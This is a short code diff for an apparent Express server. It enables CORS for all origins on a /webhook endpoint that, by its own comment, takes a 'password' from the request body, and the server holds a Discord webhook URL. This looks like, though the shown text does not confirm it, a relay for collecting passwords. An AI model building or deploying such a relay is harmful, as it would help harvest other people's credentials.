@@ -11,6 +11,9 @@ app.use(bodyParser.json());
 // Discord webhook URL (set this as an environment variable in Render)
 const DISCORD_WEBHOOK_URL = process.env.WEBHOOK_URL;
 
+const cors = require('cors');
+app.use(cors()); // Allow all origins by default
+
 app.post('/webhook', (req, res) => {
     const { content } = req.body;  // Extract the content (password) from the request
 
@@ -45,3 +48,5 @@ app.post('/webhook', (req, res) => {
 app.listen(port, () => {
     console.log(`Server running on http://localhost:${port}`);
 });
+
+
